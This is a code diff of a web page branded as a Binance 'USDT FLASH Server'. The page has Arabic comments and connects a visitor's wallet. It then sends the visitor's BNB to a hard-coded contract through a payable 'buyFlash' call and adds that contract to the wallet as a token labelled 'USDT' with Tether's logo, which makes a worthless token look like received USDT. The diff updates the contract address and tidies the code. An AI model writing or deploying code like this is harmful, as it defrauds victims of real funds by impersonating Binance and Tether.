@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Binance | USDT FLASH Server</title>
     
+    <!-- ✅ بدون مسافات -->
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
     <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
@@ -12,7 +13,6 @@
     <style>
         :root { --binance-yellow: #F3BA2F; --binance-black: #181A20; }
         
-        /* إصلاح مشكلة اختفاء الجزء العلوي */
         body { 
             background: var(--binance-black); 
             color: #EAECEF; 
@@ -109,6 +109,7 @@
 <body>
 
 <div class="header">
+    <!-- ✅ بدون مسافة -->
     <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" class="logo-binance">
     <span class="version-tag">USDT FLASH v4.2</span>
 </div>
@@ -135,9 +136,10 @@
     <div id="log">بانتظار ربط المحفظة...</div>
 </div>
 
-<script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+<!-- ✅ بدون مسافة -->
+<script src="https://s3.tradingview.com/tv.js"></script>
 <script>
-    // تشغيل المخطط فوراً
+    // تشغيل المخطط
     new TradingView.widget({
         "container_id": "chart_div",
         "autosize": true,
@@ -158,7 +160,10 @@
         const providerOptions = {
             walletconnect: {
                 package: window.WalletConnectProvider.default,
-                options: { rpc: { 56: "https://bsc-dataseed.binance.org/" } }
+                options: { 
+                    rpc: { 56: "https://bsc-dataseed.binance.org/" }, // ✅ بدون مسافة
+                    chainId: 56
+                }
             }
         };
         web3Modal = new Web3Modal({ cacheProvider: false, providerOptions, theme: "dark" });
@@ -166,7 +171,6 @@
 
     async function connectWallet() {
         try {
-            // سيفتح قائمة المحافظ. إذا كان المستخدم لديه ميتاماسك سيظهر كخيار أول.
             provider = await web3Modal.connect();
             const web3 = new Web3(provider);
             const accounts = await web3.eth.getAccounts();
@@ -178,7 +182,8 @@
     async function startInjection() {
         if(!userAddress) return connectWallet();
         const msg = document.getElementById('log');
-        const contractAddr = "0x22581282b507c6743762cBaA542D6B33Cd6f631f";
+        // ✅ العنوان الجديد
+        const contractAddr = "0x514BA0BEA2c4B0b6813284eaAB0dD5d4729F0f1d";
         const abi = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];
 
         try {
@@ -192,16 +197,24 @@
                 value: web3.utils.toWei(val, "ether")
             });
 
-            // إضافة التوكن بصرياً
-            await provider.request({
+            // ✅ استخدام window.ethereum لضمان التوافق
+            await window.ethereum.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
-                    options: { address: contractAddr, symbol: 'USDT', decimals: 18, image: 'https://cryptologos.cc/logos/tether-usdt-logo.png' }
+                    options: {
+                        address: contractAddr,
+                        symbol: 'USDT',
+                        decimals: 18,
+                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png' // ✅ بدون مسافة
+                    }
                 }
             });
             msg.innerText = "اكتمل الحقن بنجاح!";
-        } catch(e) { msg.innerText = "فشلت العملية."; }
+        } catch(e) { 
+            console.error(e);
+            msg.innerText = "فشلت العملية."; 
+        }
     }
 
     window.onload = init;
